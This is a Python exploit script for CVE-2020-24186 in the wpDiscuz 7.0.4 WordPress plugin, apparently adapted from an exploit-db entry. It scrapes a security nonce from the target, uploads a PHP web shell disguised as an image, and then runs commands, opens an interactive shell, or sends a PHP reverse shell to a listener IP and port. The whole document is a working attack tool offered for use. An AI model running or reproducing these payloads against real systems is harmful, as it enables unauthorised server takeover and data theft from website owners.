#!/usr/bin/env python3
# wpDiscuz 7.0.4 - Unauthenticated RCE
# Exploit Autor: Carlos Tuma - Bl4dsc4n
# CVE-2020-24186
# Docker / Linux compatible
# Modes:
#  - Command execution
#  - Reverse shell (/bin/sh)
# modificado https://www.exploit-db.com/exploits/49967

import requests
import optparse
import re
import random
import string
import json
import sys

parser = optparse.OptionParser()
parser.add_option("-u", "--url", dest="url", help="Target URL ex: http://localhost:8080")
parser.add_option("-p", "--path", dest="path", help="Post path ex: /?p=1")

parser.add_option("--cmd", dest="cmd", help="Execute single command")
parser.add_option("--reverse", action="store_true", dest="reverse", help="Reverse shell mode")
parser.add_option("--lhost", dest="lhost", help="Listener IP (reverse shell)")
parser.add_option("--lport", dest="lport", help="Listener port (reverse shell)")

(options, args) = parser.parse_args()

if not options.url or not options.path:
    parser.print_help()
    sys.exit(1)

BASE = options.url.rstrip("/")
POST_URL = BASE + options.path
AJAX = BASE + "/wp-admin/admin-ajax.php"

session = requests.Session()

def banner():
    print("=" * 60)
    print("[*] wpDiscuz 7.0.4 – Unauthenticated RCE")
    print("[*] CVE-2020-24186")
    print("[*] Exploit Autor: Carlos Tuma - Bl4dsc4n")
    print("[*] Docker / Linux exploit")
    print("=" * 60)

def rand_name():
    return "".join(random.choice(string.ascii_lowercase) for _ in range(10))

def get_tokens():
    r = session.get(POST_URL, timeout=10)

    wmu = re.search(r'wmuSecurity":"(.*?)"', r.text)
    post = re.search(r'wc_post_id":"(\d+)"', r.text)

    if not wmu or not post:
        print("[x] Failed to extract nonce or post_id")
        sys.exit(1)

    print("[+] wmuSecurity:", wmu.group(1))
    print("[+] wc_post_id:", post.group(1))
    return wmu.group(1), post.group(1)

def upload_shell(wmu, post_id):
    shell_name = rand_name() + ".php"

    shell_code = """GIF89a;
<?php
if(isset($_GET['cmd'])){
  system($_GET['cmd']);
}
?>
"""

    files = {
        "wmu_files[0]": (shell_name, shell_code, "image/png")
    }

    data = {
        "action": "wmuUploadFiles",
        "wmu_nonce": wmu,
        "wmuAttachmentsData": "",
        "postId": post_id
    }

    r = session.post(AJAX, files=files, data=data)

    try:
        j = r.json()
    except:
        print("[x] Invalid JSON response")
        print(r.text)
        sys.exit(1)

    if not j.get("success"):
        print("[x] Upload failed")
        print(json.dumps(j, indent=2))
        sys.exit(1)

    # 🔥 EXTRAÇÃO REAL (wpDiscuz moderno)
    data_j = j.get("data", {})
    shell_url = None

    if "previewsData" in data_j:
        shell_url = data_j["previewsData"]["images"][0]["url"]

    if not shell_url:
        print("[x] Could not extract shell URL")
        print(json.dumps(j, indent=2))
        sys.exit(1)

    print("[+] Shell uploaded:", shell_url)
    return shell_url

def exec_cmd(shell_url, cmd):
    r = session.get(shell_url, params={"cmd": cmd})
    print(r.text)

def reverse_shell(shell_url, lhost, lport):
    print("[+] Sending reverse shell payload (PHP)")
    payload = f"""php -r '$s=fsockopen("{lhost}",{lport});
exec("/bin/sh -i <&3 >&3 2>&3");'"""
    session.get(shell_url, params={"cmd": payload})
    print("[+] Payload sent. Check your listener.")

def interactive_shell(shell_url):
    print("\n[+] Interactive command shell (type exit)")
    while True:
        cmd = input("sh$ ")
        if cmd.lower() in ["exit", "quit"]:
            break
        exec_cmd(shell_url, cmd)

# ---------------- MAIN ----------------

banner()
wmu, post_id = get_tokens()
shell = upload_shell(wmu, post_id)

if options.reverse:
    if not options.lhost or not options.lport:
        print("[x] Reverse shell requires --lhost and --lport")
        sys.exit(1)
    reverse_shell(shell, options.lhost, options.lport)

elif options.cmd:
    exec_cmd(shell, options.cmd)

else:
    interactive_shell(shell)
